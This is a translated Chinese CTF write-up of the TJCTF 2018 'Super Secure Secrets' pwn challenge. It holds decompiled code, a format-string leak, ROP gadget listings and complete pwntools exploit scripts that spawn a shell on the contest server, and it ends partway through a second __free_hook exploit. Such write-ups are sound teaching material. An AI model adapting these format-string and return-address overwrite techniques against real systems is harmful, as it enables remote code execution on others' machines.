# TJCTF 2018 Pwn_Re专题全解析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
TJCTF2018，面向高中生的比赛，前天结束，题目不算难，AK了RE&&PWN，不过最后一个PWN做的时候有些意思，放在最开始。
## 0x01 Super Secure Secrets
(可能有点非预期)  
题目没给libc文件  
先看保护：  
No PIE  
第一反应是利用ret2_dl_runtime_resolve  
首先看到：  
main:
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      lets_not_be_friends(*(_QWORD *)&argc, argv, envp);
      secure_service();
      return 0;
    }
secure_service函数：
    unsigned __int64 secure_service()
    {
      char v1; // [rsp+0h] [rbp-130h]
      char v2; // [rsp+20h] [rbp-110h]
      char s; // [rsp+A0h] [rbp-90h]
      unsigned __int64 v4; // [rsp+128h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      puts("Welcome to the Super Secure Service TM");
      puts("FREE TRIAL VERSION -- Limited to viewing only one message.");
      puts("Upgrade to PREMIUM for only $999!");
      putchar(10);
      print_help(10LL);
      while ( 1 )
      {
        printf("> ");
        fgets(&s, 128, stdin);
        switch ( s )
        {
          case 104:
            print_help(&s);
            continue;
          case 115:
            set_message(&v2, &v1);
            continue;
          case 117:
            upgrade();
            continue;
          case 118:
            get_message(&v2, &v1);
            return __readfsqword(0x28u) ^ v4;
          case 120:
            return __readfsqword(0x28u) ^ v4;
          default:
            continue;
        }
      }
    }
get_message:
    unsigned __int64 __fastcall get_message(char *a1, const char *a2)
    {
      signed int i; // [rsp+1Ch] [rbp-54h]
      char v4[6]; // [rsp+20h] [rbp-50h]
      char v5; // [rsp+26h] [rbp-4Ah]
      char s2; // [rsp+30h] [rbp-40h]
      char s; // [rsp+40h] [rbp-30h]
      unsigned __int64 v8; // [rsp+68h] [rbp-8h]
      v8 = __readfsqword(0x28u);
      puts("Message Password:");
      do
        fgets(&s, 32, stdin);
      while ( strcmp(a2, &s) );
      puts("Secret Message:");
      puts("====================");
      printf(a1, &s, a2);
      puts("====================");
      for ( i = 0; i bin_sh_addr->system_addr
    ROPgadget --binary ./super_secret  --ropchain
    Gadgets information
    ============================================================
    0x0000000000400e2f : adc eax, dword ptr [rax] ; jmp rax
    0x0000000000400759 : adc eax, dword ptr [rcx] ; add byte ptr [rax], al ; add rsp, 8 ; ret
    0x0000000000400dc7 : add al, bpl ; ret 0xfff9
    0x0000000000400dc8 : add al, ch ; ret 0xfff9
    0x0000000000400f9f : add bl, dh ; ret
    0x0000000000400f9d : add byte ptr [rax], al ; add bl, dh ; ret
    0x0000000000400f9b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
    ......
为了简化利用过程，我们只需要修改返回地址  
bin_sh_addr+system_addr何以用secure_service的set_message来布置，因为password的位置恰好在get_message返回地址的正下方  
Exploit:（这里我利用了第一次的password来获取/bin/sh字符串，没有使用libc中的/bin/sh，因为最初没找到libc版本，只能在服务器readelf获取system偏移）（同时注意输入正确验证码，否则get_message会执行memset(a1,
0, 0x80uLL);）
    from pwn import *
    #context.log_level = 'debug'
    p=process("./super_secret")
    p.recvuntil("> ")
    payload1=p64(0x000400DA1)*15
    p.sendline(payload1)
    p.recvuntil("> ")
    p.sendline("s")
    p.recvuntil("Password:n")
    p.sendline("/bin/shx00")
    p.recvuntil("Message:n")
    p.sendline("%17$16llx%20$16llx%20$hhn")
    p.recvuntil("> ")
    p.sendline("v")
    p.recvuntil("Password:n")
    p.sendline("/bin/shx00")
    p.recvuntil("====================n")
    key=p.recvuntil("n")
    fgets_AD_addr=int(key[0:17],16)
    fgets_addr=fgets_AD_addr-0xad
    system_addr=fgets_addr-0x6dad0+0x000000000045390
    ebp_addr=int(key[17:33],16)
    ebp_new=(ebp_addr&0xffffffffffffff00)+0x20+0x10
    bin_sh_addr=ebp_addr-0x130
    pop_edi_ret=0x0000000000400f93 
    p.recvuntil("Captcha: ")
    ch=p.recv()[:6]
    p.sendline(ch)
    payload=p64(bin_sh_addr)+p64(system_addr)
    p.recv()
    p.sendline("s")
    p.recv()
    p.sendline(payload)
    p.recv()
    retn_addr=ebp_new-0x138
    print hex(retn_addr)
    payload3="%3987c%28$hn%41c"+p64(retn_addr)
    p.sendline(payload3)
    print p.recvuntil("> ")
    p.sendline("v")
    p.recv()
    p.sendline(payload)
    p.recvuntil("Captcha: ")
    ch=p.recv()[:6]
    p.sendline(ch)
    p.interactive()
在本地成功打到shell  
不过远程总是报错：
    timeout: the monitored command dumped core
猜测是服务器端运行时环境变量的缘故  
最后选择使用one_gadget获取执行execve(“/bin/sh”)的地址来打到shell
    $ one_gadget  ./libc.so.6
    0x4f2c5    execve("/bin/sh", rsp+0x40, environ)
    constraints:
      rcx == NULL
    0x4f322    execve("/bin/sh", rsp+0x40, environ)
    constraints:
      [rsp+0x40] == NULL
    0x10a38c    execve("/bin/sh", rsp+0x70, environ)
    constraints:
      [rsp+0x70] == NULL
修改pop rdi;ret后的system地址为execve(“/bin/sh”)的地址  
最终远程打到shell:
    from pwn import *
    p=remote("problem1.tjctf.org",8009)
    p.recvuntil("> ")
    payload1=p64(0x000400DA1)*15
    p.sendline(payload1)
    p.recvuntil("> ")
    p.sendline("s")
    p.recvuntil("Password:n")
    p.sendline("/bin/shx00")
    p.recvuntil("Message:n")
    p.sendline("%17$16llx%20$16llx%20$hhn")
    p.recvuntil("> ")
    p.sendline("v")
    p.recvuntil("Password:n")
    p.sendline("/bin/shx00")
    p.recvuntil("====================n")
    key=p.recvuntil("n")
    fgets_AD_addr=int(key[0:17],16)
    fgets_addr=fgets_AD_addr-0xad
    execve_addr=fgets_addr-0x7eb20+0x0000000010a38c
    ebp_addr=int(key[17:33],16)
    ebp_new=(ebp_addr&0xffffffffffffff00)+0x20+0x10
    bin_sh_addr=ebp_addr-0x130
    pop_edi_ret=0x0000000000400f93 
    p.recvuntil("Captcha: ")
    ch=p.recv()[:6]
    p.sendline(ch)
    payload=p64(bin_sh_addr)+p64(execve_addr)
    p.recv()
    p.sendline("s")
    p.recv()
    p.sendline(payload)
    p.recv()
    retn_addr=ebp_new-0x138
    hex(retn_addr)
    payload3="%3987c%28$hn%41c"+p64(retn_addr)
    p.sendline(payload3)
    p.recvuntil("> ")
    p.sendline("v")
    p.recv()
    p.sendline(payload)
    p.recvuntil("Captcha: ")
    ch=p.recv()[:6]
    p.sendline(ch)
    p.interactive()
**另一种解法：**
> Because printf utilizes malloc and free, we can trigger a free call just by
> doing ‘%65537c’.  
>  And we can overwrite __free_hook to listen to free calls, therefore, invoke
> our own function.
    from pwn import *
    # context.log_level = 'debug'
    context.binary = './super_secure'
    sh = process('./super_secure')
    # sh = remote('problem1.tjctf.org', 8009)
    def send_payload(payload, p=False):
      sh.sendlineafter('> ', 's')
      sh.sendlineafter(':n', '123')
      sh.sendlineafter(':n', payload)
      sh.sendlineafter('> ', 'v')
      sh.sendlineafter(':n', '123')
      if p:
        sh.recvuntil('====================n')
        out = sh.recvuntil('====================n').split('n')[0]
        print out
      sh.sendline('')
      if p:
        return out
    memset_got = 0x00602050